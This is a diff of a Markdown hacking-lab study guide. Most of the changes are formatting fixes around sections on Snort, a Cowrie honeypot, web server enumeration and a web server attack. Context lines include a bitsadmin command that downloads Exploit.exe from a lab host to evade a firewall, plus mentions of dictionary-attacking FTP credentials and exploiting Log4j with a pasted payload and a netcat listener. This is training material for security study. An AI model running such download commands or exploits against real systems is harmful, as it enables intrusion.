@@ -1556,6 +1556,7 @@ then open cmd
  Go to the C:\Snort\log\10.10.1.19 folder and open the ICMP_ECHO.ids file with Notepad++. You see that all the log entries are saved in the ICMP_ECHO.ids file.
  ```
  </details>
+
  <details>
  <summary>Deploy Cowrie Honeypot to Detect Malicious Network Traffic</summary>
 
@@ -1619,6 +1620,7 @@ again switch back to ubuntu and
 tail cowrie.log
 ```
 </details>
+
 <details>
 <summary>Evade Firewall through Windows BITSAdmin</summary>
 
@@ -1633,6 +1635,8 @@ bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.e
 and payload loaded to self
 ```
 </details>
+
+# Hacking WEB server
 
 <details>
 
@@ -1650,8 +1654,10 @@ GET / HTTP/1.0 and press Enter twice.
 :~$telnet www.moviescope.com 80.
 and hit double enter
 ```
-</detaisl>
+</details>
+
 <details>
+
 <summary>Enumerate Web Server Information using Nmap Scripting Engine (NSE)</summary>
 
 *NSE
@@ -1670,9 +1676,11 @@ Perform an HTTP trace on the targeted domain.
    ```console
    :~$map -p80 --script http-waf-detect www.goodshopping.com\
    ```
-   </details>
-   <details>
-   <summary> Perform a Web Server Attack</summary>
+</details>
+
+<details>
+
+<summary> Perform a Web Server Attack</summary>
 
    * Crack FTP credentials using a Dictionary Attack
    ```console
@@ -1697,7 +1705,9 @@ and then
 :~$ help to see available option
 ```
 </details>
-<details>
+
+<details>\
+
 <sumamry>Gain Access to Target Web Server by Exploiting Log4j Vulnerability</summary>
 
 * we will install a vulnerable server in the Ubuntu machine
@@ -1746,6 +1756,7 @@ Firefox browser window, in Username field paste the payload that was copied and 
 Now switch to the netcat listener, 
 ```
 </details>
+
 <details>
 <summary>with ai</summary>
 
